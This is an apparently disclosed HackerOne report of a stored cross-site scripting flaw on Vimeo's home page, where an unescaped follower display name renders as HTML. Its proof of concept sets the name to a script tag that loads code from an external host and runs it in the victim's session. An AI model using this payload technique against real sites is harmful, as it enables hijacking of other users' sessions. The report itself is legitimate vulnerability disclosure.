# XSS on vimeo.com/home after other user follows you

## Report Details
- **Report ID**: 87854
- **URL**: https://hackerone.com/reports/87854
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-09-07T13:43:25.171Z
- **Disclosed**: 2017-08-31T10:25:58.730Z

## Reporter
- **Username**: stefanovettorazzi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
__Description__

If some user follows you on Vimeo, the Name of the user appears in the header of your Home like "[Name] followed you. The staff posted...".
The problem is that the Name is not escaped, which allows to insert HTML code.

__Proof of concept__

1. Using the attacker's account, go to https://vimeo.com/settings.
2. Change the _Name_ to `<script src=//u00f1.xyz>`.
3. Click on _Save Changes_.
4. Go to the victim's Profile.
5. Click on _Follow_ (is at the bottom of the profile picture).
6. Using the victim's account, go to https://vimeo.com/home.
7. https://u00f1.xyz is loaded and `alert(document.domain)` is executed.

I attached a screen capture to identify where the Name of the attacker appears. In this case I used an `<img>` as the Name of the attacker, you can notice the broken image.

## Attachments
- Screen_Shot_2015-09-07_at_10.38.36.png
